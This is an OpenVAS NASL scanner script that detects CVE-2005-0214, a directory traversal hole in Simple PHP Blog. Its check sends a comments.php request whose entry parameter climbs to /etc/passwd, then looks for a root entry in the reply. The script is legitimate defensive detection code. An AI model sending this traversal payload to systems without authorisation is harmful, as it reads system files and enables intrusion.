# OpenVAS Vulnerability Test
# $Id: sphpblog_dir_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Simple PHP Blog dir traversal
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host runs Simple PHP Blog, an open source blog written in PHP,
which allows for retrieval of arbitrary files from the web server.
These issues are due to a failure of the application to properly 
sanitize user-supplied input data.";

tag_solution = "Upgrade at least to version 0.3.7 r2.";

# Ref: Alexander Palmo

if(description)
{
 script_id(16137);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2005-0214");
 script_bugtraq_id(12193);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 
 name = "Simple PHP Blog dir traversal";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Simple PHP Blog dir traversal";
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);

 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 family = "Remote file access";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# the code
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

function check(loc)
{
 req = http_get(item:string(loc,  "/comments.php?y=05&m=01&entry=../../../../../../../etc/passwd"), port:port);
 rep = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( !rep )exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
 {
 	security_warning(port);
	exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
